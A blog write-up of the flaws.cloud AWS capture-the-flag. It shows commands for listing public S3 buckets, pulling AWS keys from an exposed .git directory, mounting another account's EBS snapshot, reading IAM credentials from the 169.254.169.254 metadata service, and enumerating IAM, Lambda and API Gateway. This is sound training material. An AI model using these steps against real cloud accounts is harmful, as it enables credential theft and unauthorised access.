---
layout: default
title: Cloud security practice with flaws.cloud
---

# Cloud security practice with flaws.cloud

In the past week, I've been spending my time playing around with cloud services, deploying random stuff just to try and figure out how it's being used.
I also wanted to have a vulnerable environment to try and extract something that isn't usually made available.
It was then when I stumbled across this `flaws.cloud`.

It is basically a cloud CTF, deployed on AWS. Explains about some common misconfigurations and how to take advantage of those mistakes.

# Let's start with Level 1

### Finding the subdomain that contains s3 bucket for `flaws.cloud`

AWS S3 buckets follow this pattern

```bash
bucket-name.s3.region.amazonaws.com
bucket-name.s3.amazonaws.com
```

In this case, a little bit of google dorking will be enough

```bash
flaws.cloud site:s3.amazonaws.com
```

**S3 Buckets should configured so that they are not publicly available. If the bucket policy is modified to allow everybody "s3:GetObject" privilege, then anyone can access the bucket.**

The first link had the contents of the s3 bucket in XML format
I thought I'll be able to find something interesting in robots.txt file...
![](/assets/images/flaws-cloud/xml-in-bucket.png)

but...
![](/assets/images/flaws-cloud/robots-contents.png)

Looking further I found something that actually was a hint
![](/assets/images/flaws-cloud/actual-hint.png)
**secret-dd02c7c.html** was the page I was looking for.
That page gave me the link to the **Second Level**

# Levelling up (Level 2)

For this challenge, use of `aws-cli` was required.

Setting it up is fairly easy, take the **Secret Key** and **Access Key** from your own AWS account and use those to configure awscli profile

```bash
aws --profile configure <profile-name>
```

After that just enter the keys and an output format.

Now, that we have an AWS account and the bucket url we can try to list the contents of the bucket.

```bash
aws s3 --profile <profile-name> ls s3://<bucket-url>
```

The contents of this bucket practically showed me the way to level 3.

# Reached Level 3

Heading over to the url we're provided, it's pretty obvious that there's a .git directory inside that bucket
![](/assets/images/flaws-cloud/git-directory-xml.png)

Then I downloaded the entire bucket, so that I can extract something from the .git directory.

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-east-1
```

By the way, we need to add this **--no-sign-request** flag because credentials were not loaded while making the request, probably because the bucket didn't require us to have any.

I used [GitTools](https://github.com/internetwache/GitTools.git) to extract information from the .git directory. This game me the AWS access key for "Scott Flaws" account. I put those in `~/.aws/credentials` file and guess what, those keys weren't revoked and now I have access to his account! That was easy.
The first thing I did after acquiring keys to his account, listed some buckets!

```bash
kali:level_3/ (b64c8dc✗) $ aws s3 --profile scott_flaws ls
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

Looks like I have found the way for all the levels.

_SPOILER ALERT_ I didn't have enough permissions to access some of those buckets. But bucket 4 was available.

# Moving on to Level 4

To clear this level, We have to get access to a webpage at [ http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud)

**A snapshot of that EC2 instance was taken right after setting up nginx on that website.**

Now even I am not able to access the s3 buckets, so the next thing that comes to my mind are EC2 Instances. In the level description it is also mentioned that a **snapshot was taken** right after nginx was setup on that instance.
Some EC2 instacnes aren't made public and are only accessible by some selected accounts.

So to find the snapshot first I had to somehow list the snapshots that user account has access to.

This is where I had to explore the aws cli a little more.
There are tons of commands in aws cli, here is the one to enumerate user details.

### sts (Security Token Service)

According to AWS docs\:

> Security Token Service (STS) enables you to request temporary, limited-privilege credentials for Identity and Access Management (IAM) users or for users that you authenticate (federated users).

I'm going to use get-caller-identity to find the details of the IAM user or role whose credentials are used to run the aws command.

```bash
# to find the owner-id, so that I can filter the snapshots
aws --profile <compromised-account> sts get-caller-identity

aws --profile <compromised-account> ec2 describe-snapshots --owner-id <compromised-owner-id> --region <region-name-compromised-account>
```

![](/assets/images/flaws-cloud/get-caller-identity.png)

Now that I have the "SnapshotID" I can attach this snapshot as an EBS volume on my own instance.

### Creating EBS Volume from SnapshotID

```bash
aws --profile <own-account> ec2 create-volume --availability-zone <snapshot-availability-zone> --region <snapshot-region> --snapshot-id <snapshot-id>
```

Then I just log into my instance using my SSH Key, mount the attached EBS volume and now I can freely move around that snapshot until I find something interesting, like this **setupNginx.sh** script lying inside the user's home directory.

It has the required credentials required for unlocking level 5 webpage

# Unlocked Level 5

There's this line, probably a hint for this level.

> On cloud services, including AWS, the IP 169.254.169.254 is magical. It's the metadata service.

Basically, this exists so that the cloud providers can retrieve user data and data about their own instances. This can easily be accessed locally from an authenticated account.
It is mentioned in the AWS docs how to access this meta-data for a specific instance. After a little bit of googling I found the address where user credentials are generally stored.

![](/assets/images/flaws-cloud/found-metadata.png)

Found another set of creds inside iam/security-credentials, fed those to my aws cli and was able to access another account!

Then I took the level-6 bucket name from "Scott's" account, tried to list it's contents from this account and guess what, I have enough privileges to do that. This gave me the exact endpoint where the index.html of level-6 is located.

Here are some common techniques being used to ensure security of this metadata.

- Google has certain constraints on the access such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing connections with `X-Forwaded-For` header for obvious reasons.

- AWS has created this IDMSv2 that required special headers, a challenge & a response and some more protections, although it's upto the accounts to enforce this.

- Ensure applications don't allow access to this magic IP (169.254.169.254) and IAM roles are as restricted as possible.

# The final level - Level 6

In this challenge, I probably had to look around in a certain user's account and find a way to Level 7, which is the finish line.

First things first, **finding this users's details**
This level already provided me with a set of access keys for an account, so I set those up with aws cli and...

```bash
kali:level_6/ $ aws --profile level7_flaws iam get-user
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16Z"
    }
}
```

Next checked user permissions, to check what this account has access to.

```bash
kali:level_6/ $ aws --profile level7_flaws iam list-attached-user-policies --user-name Level6
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}
```

**SecurityAudit** gives permissions to monitor accounts for compliance with security requirements. So this account has access to logs and events to investigate potential security breaches or potential malicious activity, seems like it has access to a lot of information.
It even gives permissions to enumerate the lambda functions, and that's exactly what I'm going to do.

```bash
kali:flaws.cloud/ $ aws --region us-west-2 --profile level7_flaws lambda list-functions
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
```

Running that function...

```bash
kali:flaws.cloud/ $ aws --region us-west-2 --profile level7_flaws lambda get-policy --function-name Level6
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
```

This verifies that we have the ability to execute the function "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/\*/GET/level6" "s33ppypa75" is the rest-api-id that be used with the resource we have access to due to "list_apigateway" policy.

Now, remember there was another custom policy associated with this account I looked into that too using that's policy ID.

```bash
kali:level_6/ $ aws --profile level7_flaws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z",
        "Tags": []
    }
}

kali:level_6/ $ aws --profile level7_flaws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```

According to this response, we can call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/\*" We can use the information obtained from enumerating the resources available with "SecurityAudit" policy

```bash
kali:flaws.cloud/ $ aws --profile level7_flaws --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```

Lambda functions are called using that rest-api-id, stage name, region and resource like https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6, and with this, I'm done!

![](/assets/images/flaws-cloud/complete.png)
